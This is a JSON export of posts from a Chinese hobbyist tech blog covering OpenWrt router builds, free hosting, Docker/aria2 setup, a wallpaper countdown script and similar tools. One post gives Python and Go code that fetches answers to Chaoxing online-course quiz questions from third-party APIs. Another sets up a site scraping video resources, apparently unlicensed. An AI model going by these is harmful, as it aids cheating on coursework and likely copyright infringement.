[{"title":"小米RA4千兆版新手入坑指南","date":"2021-03-07T10:45:37.000Z","path":"openwrt-xiaomi-r4a.html","text":"云编译自己的小米RA4千兆版OpenWrt breed直刷固件，自定义个性插件 本想添加京东签到插件，于是就开始找资料，云编译R4A固件，结果遇到了各种问题，就有了本文章。 1. 刷入不死breed参考大佬@航校门口二楼修 的 [R4A]小米r3G v2和小米R4A，Windows系统下刷breed视频 教程。 小米r3G v2和小米R4A千兆版是同样的配置。 注意一个小细节，第一次接触软路由刷机，重启那一步没看懂。。。一开始不知道要怎么弄，还以为刷坏了。 即断电，按住reset键，再插入电源，等待5秒，浏览器访问 192.168.1.1 ，就进入 breed界面了。 2. 刷入固件恩山论坛，各位大神编好的固件有很多。推荐一个 【2021-2-28】小米路由器3GV2(R4A千兆版) OpenWrt固件|IPV6|多拨|breed直刷版 用了他的固件，才吸引我想要自己编一个的兴趣。 3. 云编译，自定义自己用的固件由于小米R4A千兆版只有16Mb RAM，装不了太多东西，一个plus+基本就没了 编译完的固件squashfs版，不能直刷，会无限重启，但initramfs版的能用而且能装很多插件，但是重启后配置就没了（可以考虑，把配置直接写在固件里，真是个小机灵鬼，有空试试）initramfs版和squashfs版区别，见 openwrt之initramfs-kernel 3.1 魔改 openwrt 源码注： 需要魔改源码，按照大佬@ pidge 提供的方法 分享小米R4A千兆版编译OPENWRT(Breed直刷版) 修改，编译生成的固件就可以用breed直刷了 3.1.1 Fork源码coolsnowwolf/lede 记得 star 星标支持一下 3.1.2 修改源码按照大佬 pidge 说的来就行了。 3.2 云编译设置云编译基于 P3TERX/Actions-OpenWrt 项目 3.2.1 修改 feed.default部分插件被隐藏了下载 feed.default ，把前面的#去掉就可以看见自己想要的插件 3.2.2 修改 .config设置为 r4a 的相关配置，或者进ssh后修改 CONFIG_TARGET_ramips=y CONFIG_TARGET_ramips_mt7621=y CONFIG_TARGET_ramips_mt7621_DEVICE_xiaomi_mir3g-v2=y 3.2.3 修改 .github/workflows 打开ssh可以修改.github/workflows 下的 build-openwrt.yml 开启，或者运行Actions时选择 true 详见 SSH 连接到 Actions 跟换为魔改的 openwrt源，并上传至奶牛快传，方便下载 详见 上传固件到奶牛快传临时存放，连接有效好像是24小时？？ 3.2.5 修改diy-part2.sh修改 diy-part2.sh 参考自 281677160/build-openwrt # 修改openwrt登陆地址,把下面的192.168.5.1修改成你想要的就可以了 sed -i &#39;s/192.168.1.1/192.168.5.1/g&#39; package/base-files/files/bin/config_generate # 修改主机名字，把Xiaomi-R4A修改你喜欢的就行（不能纯数字或者使用中文） sed -i &#39;/uci commit system/i\\uci set system.@system[0].hostname=&#39;Xiaomi-R4A&#39;&#39; package/lean/default-settings/files/zzz-default-settings # 版本号里显示一个自己的名字（ababwnq build $(TZ=UTC-8 date &quot;+%Y.%m.%d&quot;) @ 这些都是后增加的） sed -i &quot;s/OpenWrt /ababwnq build $(TZ=UTC-8 date &quot;+%Y.%m.%d&quot;) @ OpenWrt /g&quot; package/lean/default-settings/files/zzz-default-settings # 修改 argon 为默认主题,可根据你喜欢的修改成其他的（不选择那些会自动改变为默认主题的主题才有效果） sed -i &#39;s/luci-theme-bootstrap/luci-theme-argon/g&#39; feeds/luci/collections/luci/Makefile # 设置密码为空（安装固件时无需密码登陆，然后自己修改想要的密码） sed -i &#39;s@.*CYXluq4wUazHjmCDBCqXF*@#&amp;@g&#39; package/lean/default-settings/files/zzz-default-settings 3.3 开始编译 等到 ssh连接 界面 单击 url 进行访问; 黑屏 按 Ctrl+C变为命令行模式 ;输入 cd openwrt/ &amp;&amp; make menuconfig 进入菜单 3.3.1 设置插件插件对照参考 OpenWrt 编译 LuCI -&gt; Applications 添加插件应用说明-L大附上，自用精简版本设置 #去除 luci-app-accesscontrol #访问时间控制 luci-app-arpbind #IP/MAC绑定 luci-app-autoreboot #支持计划重启 luci-app-ddns #动态域名 DNS（集成阿里DDNS客户端） luci-app-filetransfer #文件传输（可web安装ipk包） luci-app-nlbwmon #网络带宽监视器 luci-app-ramfree #释放内存 luci-app-unblockmusic #解锁网易云灰色歌曲3合1新版本 luci-app-upnp #通用即插即用UPnP（端口自动转发） luci-app-vlmcsd #KMS服务器设置 luci-app-vsftpd #FTP服务器 luci-app-wol #WOL网络唤醒 #保留 luci-app-firewall #添加防火墙 luci-app-flowoffload #Turbo ACC网络加速 luci-app-webadmin #Web管理页面设置 #添加 luci-theme-argon #argon主题 3.6 下载固件一般两个小时左右编译完成 3.7 刷入体验以上知识学习全是来自互联网，各位大佬的无私分享，折腾了几天。","tags":[{"name":"openwrt","slug":"openwrt","permalink":"https://www.unkaer.cf/tags/openwrt/"}]},{"title":"答案助手","date":"2020-06-02T00:22:25.000Z","path":"daan.html","text":"用 python 做得答案助手，题库接口来自 超星网课脚本 。python运行效率太慢，又做了一个 go语言版。 原理post 提交问题 获取 json 题目和答案字段 格式化输出 目前集成了 4个 接口不保证以后 一直能用 pythonpython 解释型语言，代码简单，库全。 python版# -*- coding: utf-8 -*- from requests import post from json import loads def chaxun1(wenti): url = &quot;http://cx.beaa.cn/cx.php&quot; data = {&#39;content&#39;: wenti} res = post(url=url,data=data) if res.status_code == int(&quot;200&quot;) : res = res.text print(&quot;-----------\\n接口1：&quot;) res = loads(res) title = res[&quot;title&quot;] print(&quot;题目是：&quot;+title) answer = res[&quot;answer&quot;] print(&quot;答案是：\\n&quot;+answer+&quot;\\n&quot;) else: print(&#39;-----------\\n接口1错误&#39;+str(res.status_code)) def chaxun2(wenti): url = &quot;http://cx.icodef.com/wyn-nb&quot; data = {&#39;question&#39;: wenti} res = post(url=url,data=data) if res.status_code == int(&quot;200&quot;) : res = res.text print(&quot;-----------\\n接口2：&quot;) res = loads(res) answer = res[&quot;data&quot;] print(&quot;答案是：\\n&quot;+answer+&quot;\\n&quot;) else: print(&#39;-----------\\n接口2错误&#39;+str(res.status_code)) def chaxun3(wenti): url = &quot;http://api.902000.xyz:88/wkapi.php&quot; data = {&#39;q&#39;: wenti} res = post(url=url,data=data) if res.status_code == int(&quot;200&quot;) : res = res.text print(&quot;-----------\\n接口3：&quot;) res = loads(res) title = res[&quot;tm&quot;] print(&quot;题目是：&quot;+title) answer = res[&quot;answer&quot;] print(&quot;答案是：\\n&quot;+answer) else: print(&#39;-----------\\n接口3错误&#39;+str(res.status_code)) def chaxun4(wenti): url = &quot;http://api.xmlm8.com/tk.php&quot; data = {&#39;t&#39;: wenti} res = post(url=url,data=data) if res.status_code == int(&quot;200&quot;) : res = res.text print(&quot;-----------\\n接口4：&quot;) res = loads(res) title = res[&quot;tm&quot;] print(&quot;题目是：&quot;+title) answer = res[&quot;da&quot;] print(&quot;答案是：\\n&quot;+answer) else: print(&#39;-----------\\n接口4错误&#39;+str(res.status_code)) f = 1 print(&quot;本程序 制作 by z7l \\n 接口来自互联网 \\n 目前题库仅适用于超星网课&quot;) while f==1: wenti = input(u&#39;\\n请输入问题： 输入\\&#39;q\\&#39;退出\\n&#39;) if wenti == &#39;q&#39;: f = 0 else: chaxun1(wenti) chaxun2(wenti) chaxun3(wenti) chaxun4(wenti) print(&quot;-----查询结束----\\n&quot;) 打包一个小图标 pyinstaller -F -i cx.ico daan.py 文件下载答案助手1.5.exe go换为效率更快的go 语言， json处理来自thedevsaddam/gojsonq ，我设置的位置是 github/gojsonq 。 go 语言版package main import ( &quot;fmt&quot; &quot;net/http&quot; &quot;strings&quot; &quot;io/ioutil&quot; &quot;github/gojsonq&quot; ) func main() { var wenti string var url = [4]string{&quot;http://cx.beaa.cn/cx.php&quot;, &quot;http://cx.icodef.com/wyn-nb&quot;, &quot;http://api.902000.xyz:88/wkapi.php&quot;, &quot;http://api.xmlm8.com/tk.php&quot;} var data = [4]string{&quot;content&quot;, &quot;question&quot;, &quot;q&quot;, &quot;t&quot;} var answer = [4]string{&quot;answer&quot;, &quot;data&quot;, &quot;answer&quot;, &quot;da&quot;} var timu = [4]string{&quot;title&quot;, &quot;&quot;, &quot;tm&quot;, &quot;tm&quot;} fmt.Println(&quot;本程序 制作 by z7l \\n 接口来自互联网 \\n 目前题库仅适用于超星网课&quot;) for true { fmt.Println(&quot;\\n请输入问题：&quot;) fmt.Scanln(&amp;wenti) for i := 0; i &lt; 4; i++ { fmt.Println(&quot;---------\\n 接口&quot;, i) PostData(wenti,url[i],data[i],answer[i],timu[i]) } fmt.Println(&quot;\\n-----查询完毕-----&quot;) } } func PostData(wenti,url,question,answer,timu string){ resp, err := http.Post(url,&quot;application/x-www-form-urlencoded&quot;,strings.NewReader(question+&quot;=&quot;+wenti)) if err != nil { fmt.Println(err.Error()) } body, err := ioutil.ReadAll(resp.Body) if err != nil { fmt.Println(err) } res :=gojsonq.New().FromString(string(body)).Find(timu) fmt.Println(&quot;题目: &quot;, res) res =gojsonq.New().FromString(string(body)).Find(answer) fmt.Println(&quot;答案: &quot;, res) } 打包go build daan.go 文件下载答案助手2.1.exe","tags":[]},{"title":"byet免费空间","date":"2020-05-03T08:50:02.000Z","path":"byhost.html","text":"官网https://byet.host/注册很简单，有邮箱就行。 之前的 infinityfree 免费空间，账号被禁用了。被迫重新找了一个免费空间 配置免费套餐详情主要功能 PHP &amp; MySQL included with every free hosting plan5GB 磁盘空间FTP 帐户和文件管理器控制面板MySQL 数据库和 PHP 支持免费技术支持无限附加域、暂留域、子域免费社区访问（论坛）群集服务器没有广告！https SSL 证书可以添加到 cPanel 中。（不支持中间 CA 证书。 后台管理面板是 vistapanel 有中文，操作十分方便。 注意5GB 磁盘空间 最大10MB的文件数据库是无限的PHP 支持的版本 5.4、5.5、5.6 和 7.0","tags":[{"name":"免费空间","slug":"免费空间","permalink":"https://www.unkaer.cf/tags/%E5%85%8D%E8%B4%B9%E7%A9%BA%E9%97%B4/"}]},{"title":"heroku部署在线音乐站","date":"2020-05-02T08:02:15.000Z","path":"music-heroku.html","text":"MKOnlineMusicPlayer在线音乐项目php部署到heroku，同时学习一下heroku。准备 heroku账号 需要科学 MKOnlineMusicPlayer源码蓝奏云下载Onedrive网盘高速下载 heroku命令行工具 安装很简单 步骤 创建 heroku 项目Create New App取个名字，选择服务器地址 cd 到源码在文件管理器 地址栏中输入 cmd 即可 heroku 登录heroku login会打开网页进行登录 添加远程仓库本地项目安装 git git init添加远程仓库 注意换成自己项目名称 heroku git:remote -a z7ms上传添加所有文件 备注原因 上传到master git add . git commit -am &quot;make it better&quot; git push heroku master报错error: failed to push some refs to &#39;https://git.heroku.com/z7ms.git&#39;解决报错根目录新建文件 composer.json 重新上传git add .&amp;&amp;git commit -am &quot;make it better&quot;&amp;&amp;git push heroku master访问 https://z7ms.herokuapp.com/","tags":[{"name":"heroku","slug":"heroku","permalink":"https://www.unkaer.cf/tags/heroku/"}]},{"title":"phpstudy","date":"2020-05-01T08:01:55.000Z","path":"phpstudy.html","text":"PhpStudy国内12年老牌公益软件，集安全，高效，功能与一体，已获得全球用户认可安装，运维也高效。支持一键LAMP,LNMP,集群,监控,网站,FTP,数据库,JAVA等100多项服务器管理功能。 官网http://www.phpstudy.net/ 一键式搭建LAMP,LNMP环境在win上本地做测试很方便，不必折腾安装各种环境。刚好界面大改版，8.0现在的界面很好看，操作也简单。","tags":[{"name":"phpstudy","slug":"phpstudy","permalink":"https://www.unkaer.cf/tags/phpstudy/"}]},{"title":"极简网盘","date":"2020-04-30T08:01:10.000Z","path":"jjwp.html","text":"VFM2是一个轻量级文件管理与共享系统，支持多用户，可充当网盘程序，程序无需数据库登录后台 源码下载蓝奏云下载Onedrive网盘高速下载","tags":[{"name":"网盘","slug":"网盘","permalink":"https://www.unkaer.cf/tags/%E7%BD%91%E7%9B%98/"}]},{"title":"XyPlayer4.0在线解析站，带后台","date":"2020-04-29T08:01:26.000Z","path":"jx.html","text":"整合解析接口到一个网站首页 后端后台登录 域名/admin 账户:admin 密码:admin888 后台设置 源码下载蓝奏云下载Onedrive网盘高速下载","tags":[{"name":"解析","slug":"解析","permalink":"https://www.unkaer.cf/tags/%E8%A7%A3%E6%9E%90/"}]},{"title":"在线音乐播放","date":"2020-04-28T08:01:17.000Z","path":"music.html","text":"MKOnlineMusicPlayer 是一款开源的基于 Meting 的在线音乐播放器。具有音乐搜索、播放、下载、歌词同步显示、个人网易云音乐播放列表同步等功能。 前端界面参照 QQ 音乐网页版进行布局，同时采用了流行的响应式设计，无论是在PC端还是在手机端，均能给您带来原生 app 般的使用体验。界面欣赏 ========MKOnlineMusicPlayer 是一款开源的基于 Meting 的在线音乐播放器。具有音乐搜索、播放、下载、歌词同步显示、个人网易云音乐播放列表同步等功能。 前端界面参照 QQ 音乐网页版进行布局，同时采用了流行的响应式设计，无论是在PC端还是在手机端，均能给您带来原生 app 般的使用体验。 相关链接 在线演示 http://lab.mkblog.cn/music/ 详细介绍 http://mkblog.cn/1060/ GitHub https://github.com/mengkunsoft/MKOnlineMusicPlayer 常见问题 请前往 wiki 查阅 遇到问题请详细阅读以上 wiki！ 开发文档 播放列表DIY教程本播放器支持后台自定义播放列表。打开 js/musicList.js，按照里面的说明对应修改即可。 播放器DIY教程除了自定义播放列表，本播放器还支持一些 DIY 设定，比如修改 api.php 文件的默认路径、修改搜索框的默认搜索内容等。具体请打开 js/player.js 查看 rem 变量表程序中的rem数组用于存储全局变量，具体的成员(部分)及作用见下表： 变量名 用途 rem.audio audio dom rem.playlist 当前正在播放的播放列表编号 rem.playid 正在播放的这首歌在播放列表中的编号 rem.dislist 当前显示的列表的列表编号 rem.loadPage 搜索功能已加载的页码 rem.wd 当前的搜索词 rem.source 当前选定的音乐源 rem.uid 当前已同步的用户的网易云 ID rem.uname 已登录用户的用户名 rem.sheetList 歌单容器操作对象 rem.mainList 歌曲列表容器操作对象 rem.isMobile 是否是手机浏览 源码下载蓝奏云下载Onedrive网盘高速下载","tags":[{"name":"MKOnlineMusicPlayer","slug":"MKOnlineMusicPlayer","permalink":"https://www.unkaer.cf/tags/MKOnlineMusicPlayer/"}]},{"title":"彩虹云免费虚拟主机","date":"2020-04-27T08:02:50.000Z","path":"free.html","text":"彩虹云提供免费虚拟主机官网https://www.cccyun.net/ 注册https://www.cccyun.net/index.php/index/register/ 配置 美国免费主机¥免费空间容量：500MB数据库：200MB防御：100GPHP：5.3-7.2自由切换备案：免备案 只能说能用，放一些小项目在上面没问题。（尝试搭建cms，各种报错）测了几个小的php项目没问题。","tags":[{"name":"免费","slug":"免费","permalink":"https://www.unkaer.cf/tags/%E5%85%8D%E8%B4%B9/"},{"name":"云空间","slug":"云空间","permalink":"https://www.unkaer.cf/tags/%E4%BA%91%E7%A9%BA%E9%97%B4/"}]},{"title":"infinityfree免费空间绑定cloudflare免费CDN加速","date":"2020-04-26T06:24:15.000Z","path":"infinityfree-cloudflare.html","text":"infinityfree 免费空间绑定 cloudflare 免费 CDN 加速遇到的一些坑 infinityfree 免费空间想添加自己的域名，就要把域名 NS 到 infinityfree 。但想用 cloudflare 免费 CDN 加速又出啦问题。以下是我的解决步骤(操作过程) 添加自定义域名(tk域名除外) 把域名 NS 到 infinityfree 。NS的地址在这 输入域名验证 验证成功后，空间里就多了一个，域名名字的文件夹，源码文件放到 /域名/htdocs ，就能通过域名访问了 通过cloudflare CDN 访问网站 删除DNS解析 NS 到 infinityfree 记录 （因为我直接添加CNAME记录报错，删除后不影响，应为添加CNAME以后还能解析到infinityfree） 添加 CNAME 到 infinityfree 的记录。 域名在管理面板，控制面板都有，如图","tags":[{"name":"cloudflare","slug":"cloudflare","permalink":"https://www.unkaer.cf/tags/cloudflare/"},{"name":"infinityfree","slug":"infinityfree","permalink":"https://www.unkaer.cf/tags/infinityfree/"}]},{"title":"免费搭建视频cms网址","date":"2020-04-23T10:57:58.000Z","path":"fcms.html","text":"准备 infinityfree账号 cms源码 资源网址 ftp上传工具 注册infinityfree账号官网注册流程略，应该很简单吧？只要邮箱和密码 ，然后验证邮箱。注意两点 需要科学上网因为有谷歌机器人验证 关闭广告过滤器，因为该平台是靠广告谋生的 控制台免费账号允许创建三个虚拟空间开始创建 有两个 免费的三级域名可选 xx.epizy.com xx.gd.rf就选第二个吧，短一点。然后输入密码，人机验证。免费空间就建立好了。 管理面板管理面板就能看见 fpt的地址、账号、密码 控制面板也可以进入控制面板，做一些骚操作，绑定自己的域名，一件搭建wordpass博客等等。 上传cms源码视频采集cms，有很多飞飞CMS海洋CMS苹果CMS这里推荐 飞飞CMS 因为源码包小一点，免费空间上传的时候巨慢。 上传方式有两种 第一种使用管理面板的FTP网页端上传，你可以试试，反正我一直失败。就像这样 上传到目录 /htdocs/ 下，把原来的文件删了如果你绑定了自己的域名 目录就是 /域名/htdocs/左下角上传压缩包 可以只上传，然后右键解压 也可以选 上传并解压 你试试那种方式能成功就好 第二种使用第三方FTP工具上传先把文件本地解压好，然后批量上传相应目录。我是这么成功的，花了近半个小时（去下一把棋就完事啦）。上传速度只有几k，和 我不是盘神 有的一比啦。我用的是Xftp，免费版本 修改PHP版本控制面板，找到如图所示，进去修改为 5.6版。 创建数据库控制面板，找到如图所示，创建一个数据库 安装访问 你的域名 填写信息，配置数据库密码在这里 采集视频飞飞CMS后台默认用户名 admin默认密码 admin888 这里放几个视频资源站 最大资源 ok资源 剩下的教程网上有很多，资源网站里有怎么采集，cms论坛里有各种模板，自己去发掘吧。 待续。。。采集了一半资源 (主要是第一次采集全部，有点多，后面日常使用应该没问题) (又测试了一下，把采集间隔设置为4秒，采集了一整天都没封，估计是第一天，调的采集间隔0秒，太快啦)，达到mysql限制，被暂停24小时。 免费空间，无限硬盘容量，无限流量。但CPU、硬盘、Mysql、使用不能太频繁，会被暂停。官网也没说具体的限制大小，如果个人使人，应该没问题。 附我建了采集差不多的z7影视 欢迎来看","tags":[{"name":"cms","slug":"cms","permalink":"https://www.unkaer.cf/tags/cms/"},{"name":"infinityfree","slug":"infinityfree","permalink":"https://www.unkaer.cf/tags/infinityfree/"}]},{"title":"副本altered：给我讲个故事，一个结局不是死亡和悲剧的故事","date":"2020-04-20T11:21:48.000Z","path":"altered.html","text":"记录这几天看副本，其中讲的一段故事，被触动到了 第一段台词 s01e10 32:28~34:27给我讲个故事Tell me a story.一个结局不是死亡和悲剧的故事Somdthing that doesn’t end in death and tragedy.很久很久以前Long ago,在遥远的世界and worlds away,有一位年轻的公主there was a young princess,在战争中成了孤儿orphaned in a time of war.领导王国军队的重任就落在了她的头上She was called upon to lead the armies of her kingdom,因为没有别人了for there was no other.她是最凶猛的勇士She was the fiercest of warriors,深受子明爱戴 在战场上势不可挡beloved of her people,unstoppable on the field.他每天都骑马出征 在一场场的战争中She rode out every day and saved her subjects拯救她的子民in battle after battle.但是每天晚上 当战争结束的时候But every night,when the fighting was done,她感觉很孤单shi was alone.直到有一天 一个农家小子来参军Until one day,a peasant boy came looking to join her army.和她一样孤独 愤怒和凶猛Lonely and angry and fierce as she.第一次For the first time,她发现当它冲上战场拯救他人的时候she found that when she strode out onto the field to save others,有人在她身边 会来救她there was someone at her side who had come to save her.之后最黑暗的战斗来临了Then there came the darkest battle of the war.公主和她的农家小子并肩而战The princess and her peasant boy stood,side by side,发誓只有死亡and vowed that they would be separated才能把他们分开by nothing less than death itself.她被敌人的剑刺中…she fell to enemy sword…在他眼前死去and died before his eyes.听者都为这凄美的爱情泪目And those who heard the story cried for the death of love. 第二段台词 s01e10 47:35~48:35他的公主死后After his princess died小农夫在世间游荡the peasant boy wandered the world陷入绝望中lost to despair直到有一日 他遇到了一个永生者Until one day,he came upon an immortal那人告诉他 他的公主被偷走了who told him his princess had been stolen,困在了咒语中trapped in an enchantment所以现在他寻找她 穿过每一个事件So now he seeks her,across this world and every other.因为在某处Because somewhere,冰封在玻璃之下 致命荊棘的厚墙之后sealed behind frozen glass and thick walls of deadly thorns,是沉睡的她she sleeps…等待被唤醒waiting to be awakened终有一日 他绝对And someday,without fail,会找到她he will find her. 第一季的结局第十集 720p mp4 有字幕(function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer0\"),\"loop\":true,\"volume\":0.7,\"mutex\":true,\"video\":{\"url\":\"https://gd.zan7l.tk/videos/%E7%94%B5%E8%A7%86%E5%89%A7/%E5%89%AF%E6%9C%AC%E7%AC%AC%E4%B8%80%E5%AD%A3/%E5%89%AF%E6%9C%AC.altered.carbon.s01e10.720p.mp4\"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})() Netflix 1080p mkv 没有字幕(function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer1\"),\"loop\":true,\"volume\":0.7,\"mutex\":true,\"video\":{\"url\":\"https://gd.zan7l.tk/videos/%E7%94%B5%E8%A7%86%E5%89%A7/%E5%89%AF%E6%9C%AC%E7%AC%AC%E4%B8%80%E5%AD%A3/altered.carbon.s01e10.1080p.mkv\"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})() Bilibili我把其中讲故事的两段裁出来了B站链接bv1Qk4y1R7jz .bilibili{ position: relative; width: 100%; height: 0; /*高度设置这里无效，设置为0，用padding撑开div*/ padding-bottom: 75%; /*68%到80%都可以*/ } .bilibili iframe { position: absolute; width: 100%; height: 100%; left: 0; top: 0; }","tags":[{"name":"233","slug":"233","permalink":"https://www.unkaer.cf/tags/233/"}]},{"title":"Aria2 好用的 `Docker` 容器镜像安装教程","date":"2020-04-17T01:25:46.000Z","path":"aria2.html","text":"Aria2 是支持 BT、磁力、HTTP、FTP 等下载协议的下载工具，常用做离线下载的服务端。 项目地址GitHub: P3TERX/docker-aria2-proDocker Hub: p3terx/aria2-pro请随手点个 star 支持项目 镜像特点使用 Aria2 完美配置方案 BT 下载率高、速度快重启后不丢失任务进度、不重复下载下载错误或取消下载自动删除未完成的文件防止磁盘空间占用下载完成自动清除.aria2后缀名文件自动获取 BT tracker 列表，进一步提升 BT 下载速度更好的 PT 下载支持防版权投诉、防迅雷吸血使用 aria2-builder 项目最新静态编译二进制文件 多平台：amd64, i386, arm64, armhf全功能：Async DNS, BitTorrent, Firefox3 Cookie, GZip, HTTPS, Message Digest, Metalink, XML-RPC, SFTP最新依赖库，提供更安全、稳定、快速的下载体验通过 CI 服务持续更新最新版本支持与 RCLONE 联动 自动上传 OneDrive 、Google Drive 等网盘百度网盘加速下载并转存到其它网盘自由选择上传网盘支持新一代互联网协议 IPv6定时自动更新 BT tracker 列表（无需重启）用户文件权限设置功能配置文件持久化，支持使用 watchtower 自动更新容器。极简设计，专注下载，简单易用，少即是多。 Docker安装我的系统为Debian ，使用这里只讲Debian Docker 安装，其他系统可参考Docker教程 卸载旧版本Docker 的旧版本被称为 docker，docker.io 或 docker-engine，如果已安装，请卸载它们： sudo apt-get remove docker docker-engine docker.io containerd runc 安装 Docker Engine-Community使用 Docker 仓库进行安装在新主机上首次安装 Docker Engine-Community 之前，需要设置 Docker 仓库。之后，您可以从仓库安装和更新 Docker。 Raspbian 用户不能使用此方法！ 对于 Raspbian，尚不支持使用仓库进行安装。您必须改为使用 shell 脚本方式。 设置仓库更新 apt 包索引。 $ sudo apt-get update 安装 apt 依赖包，用于通过 HTTPS 来获取仓库。 $ sudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg2 \\ software-properties-common 添加 Docker 的官方 GPG 密钥： $ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥。 $ sudo apt-key fingerprint 0EBFCD88 pub 4096R/0EBFCD88 2017-02-22 Key fingerprint = 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 uid Docker Release (CE deb) &lt;docker@docker.com&gt; sub 4096R/F273FCD8 2017-02-22 使用以下指令设置稳定版仓库 $ sudo add-apt-repository \\ &quot;deb [arch=amd64] https://download.docker.com/linux/debian \\ $(lsb_release -cs) \\ stable&quot; 安装 Docker Engine-Community更新 apt 包索引： $ sudo apt-get update 安装最新版本的 Docker Engine-Community 和 containerd $ sudo apt-get install docker-ce docker-ce-cli containerd.io 测试 Docker是否安装成功，输入以下指令，打印出以下信息则安装成功： $ sudo docker run hello-world Unable to find image &#39;hello-world:latest&#39; locally latest: Pulling from library/hello-world 1b930d010525: Pull complete Digest: sha256:c3b4ada4687bbaa170745b3e4dd8ac3f194ca95b2d0518b417fb47e5879d9b5f Status: Downloaded newer image for hello-world:latest Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/ aria2镜像安装基础使用安装命令示例。（不要无脑复制粘贴，请详细阅读选项参数说明） docker run -d \\ --name aria2-pro \\ --restart unless-stopped \\ --log-opt max-size=1m \\ --network host \\ -e PUID=$UID \\ -e PGID=$GID \\ -e RPC_SECRET=&lt;TOKEN&gt; \\ -e RPC_PORT=6800 \\ -e LISTEN_PORT=6888 \\ -v ~/aria2-config:/config \\ -v ~/aria2-downloads:/downloads \\ p3terx/aria2-pro 选项参数说明 Docker 基本选项 –name aria2-pro - 容器名称，可自定义以示区分。 –restart unless-stopped - 设置容器重启策略，详情参见 Docker 官方文档。 –log-opt max-size=1m - 日志大小限制为 1MB，防止 Aria2 持续下载产生大量的日志占用磁盘空间。 –network host - 使用 host 网络模式。 文件权限设置 -e PUID=$UID, -e PGID=$GID - 设置容器内账户 UID 与 GID。非 root 账户文件权限问题。执行 id 命令手动获取。 id Aria2 配置选项环境变量 -e RPC_SECRET= - RPC 密钥设置。默认密码：P3TERX。 -e RPC_PORT=6800 - RPC 端口设置，忽略则可通过配置文件修改。 -e LISTEN_PORT=6888 - BT 监听端口（TCP）、DHT 监听端口（UDP）设置。 -e DISK_CACHE= - 磁盘缓存设置，默认值 64M。 目录映射 -v ~/aria2-config:/config - 配置目录映射，配置文件持久化。左边为宿主机路径供自定义，不要有中文、不要混用配置文件。 -v ~/aria2-downloads:/downloads - 下载目录映射。左边为宿主机路径供自定义，不要有中文。 注意事项GID与UID设置对于非 root 账户非常重要，你不应该错过这个细节，否则可能导致不必要的麻烦。容器启动命令有关路径与端口参数中:(冒号)右边的值为容器内部固定值，无需修改也不能修改，否则无法正常工作。 常用命令 重启 docker restart aria2-pro 重装 docker rm -f aria2-pro docker rmi p3terx/aria2-pro rm -rf ~/aria2-config docker pull p3terx/aria2-pro docker run &lt;...&gt; 更新 docker run --rm \\ -v /var/run/docker.sock:/var/run/docker.sock \\ containrrr/watchtower -cR \\ aria2-pro 查看日志 查看实时日志 docker logs -f --tail 30 aria2-pro 导出日志 docker logs aria2-pro &gt; ~/aria2-pro.log 开始使用配置防火墙开放端口或端口转发设置。使用 WebUI 或 App 进行连接，推荐 AriaNg 。本站有建好的AriaNg可用体验高速远程离线下载的乐趣。 参考如果出现了什么问题可以到以下寻找，或者下发留言。Docker 教程Debian Docker 安装Aria2 Pro - 更好用的 Aria2 Docker 容器镜像","tags":[{"name":"下载","slug":"下载","permalink":"https://www.unkaer.cf/tags/%E4%B8%8B%E8%BD%BD/"},{"name":"aria2","slug":"aria2","permalink":"https://www.unkaer.cf/tags/aria2/"}]},{"title":"赛博朋克2077倒计时","date":"2020-04-14T05:16:02.000Z","path":"cyberpunk.html","text":"本该是在学校里期待游玩赛博朋克2077的日子。但，他跳票了，加上众所周知的原因。分享一下wallpaper制作赛博朋克2077跳票发售倒计时的教程。预览图 提供一个赛博朋克2077的2K图片，自取 添加文本选择一个合适的地方添加文本，内容可以像这样 距离跳票发售 2020-09-15 还有 文本右边有个小齿轮 -&gt; 选择编辑脚本脚本内容如下 &#39;use strict&#39;; // 倒计时结束时间 let targetDate = new Date(&#39;2020-09-17T00:00:00&#39;); let isRecurringEachYear = true; // 倒计时结束后显示的文本 let finalMessage = &#39;爷爷你预购的赛博朋克2077，发售了!!!&#39;; var originalText; export function update(value) { var currentDate = new Date(); if (isRecurringEachYear) { targetDate.setUTCFullYear(currentDate.getUTCFullYear()); if ((targetDate.getTime() - currentDate.getTime()) &lt; 0) { targetDate.setUTCFullYear(currentDate.getUTCFullYear() + 1); } } var diff = targetDate.getTime() - currentDate.getTime(); if (!isRecurringEachYear &amp;&amp; diff &lt; 0) { return finalMessage; } var years = Math.floor(diff / (1000 * 60 * 60 * 24 * 365)); var days = Math.floor(diff / (1000 * 60 * 60 * 24)); var hours = Math.floor(diff / (1000 * 60 * 60)) % 24; var minutes = Math.floor(diff / (1000 * 60)) % 60; var seconds = Math.floor(diff / (1000)) % 60; if (!isRecurringEachYear) { days %= 365; } value = originalText + &#39;\\n&#39;; if (years &gt; 0) { value += years + &#39;年&#39;; } if (days &gt; 0) { value += days + &#39;天&#39;; } if (hours &gt; 0) { value += hours + &#39;小时&#39; + &#39;\\n&#39;; } if (minutes &gt; 0) { value += minutes + &#39;分钟&#39;; } if (seconds &gt; 0) { value += seconds + &#39;秒&#39;; } return value; } export function init(value) { originalText = value; return value; } 可以自己修改添加一些其他东西 发挥自己的想象力吧。。","tags":[{"name":"cyberpunk","slug":"cyberpunk","permalink":"https://www.unkaer.cf/tags/cyberpunk/"},{"name":"wallpaper","slug":"wallpaper","permalink":"https://www.unkaer.cf/tags/wallpaper/"}]},{"title":"keepass免费开源的密码管理工具","date":"2020-04-14T00:20:45.000Z","path":"keepass.html","text":"由于注册的小号太多了，所以找了一款密码管理工具来帮我记录。安全性应该是没问题的。下载安装官网地址目前最新版位2.4.4选择相应的平台，下载还是挺快的。 